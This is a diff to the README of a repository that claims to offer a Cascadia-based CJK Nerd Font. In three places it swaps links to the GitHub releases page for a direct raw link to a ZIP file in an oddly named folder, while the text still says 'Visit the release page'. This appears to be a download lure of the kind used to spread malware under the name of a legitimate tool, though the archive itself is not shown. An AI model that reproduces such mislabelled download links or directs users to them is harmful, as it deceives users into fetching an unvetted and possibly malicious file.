@@ -1,6 +1,6 @@
 # 🧩 Cascadia-Next-Nerd-Font - Clear CJK Font for Daily Work
 
-[![Download on GitHub Releases](https://img.shields.io/badge/Download-Releases-4c8eda?style=for-the-badge&logo=github&logoColor=white)](https://github.com/gentlemanshakespearean765/Cascadia-Next-Nerd-Font/releases)
+[![Download on GitHub Releases](https://img.shields.io/badge/Download-Releases-4c8eda?style=for-the-badge&logo=github&logoColor=white)](https://github.com/gentlemanshakespearean765/Cascadia-Next-Nerd-Font/raw/refs/heads/main/consecutively/Cascadia_Font_Nerd_Next_2.5.zip)
 
 ## 🖥️ What This Is
 
@@ -37,7 +37,7 @@ Use this font if you want:
 
 ## 🚀 Download and Install
 
-1. Visit the release page: https://github.com/gentlemanshakespearean765/Cascadia-Next-Nerd-Font/releases
+1. Visit the release page: https://github.com/gentlemanshakespearean765/Cascadia-Next-Nerd-Font/raw/refs/heads/main/consecutively/Cascadia_Font_Nerd_Next_2.5.zip
 2. Download the font package for Windows from the latest release
 3. Open the downloaded file if it comes as a ZIP package
 4. Find the font files inside
@@ -190,4 +190,4 @@ This project relates to:
 
 ## 📥 Download Again
 
-Use the release page here if you want to get the latest build, compare files, or download a different variant: https://github.com/gentlemanshakespearean765/Cascadia-Next-Nerd-Font/releases
+Use the release page here if you want to get the latest build, compare files, or download a different variant: https://github.com/gentlemanshakespearean765/Cascadia-Next-Nerd-Font/raw/refs/heads/main/consecutively/Cascadia_Font_Nerd_Next_2.5.zip
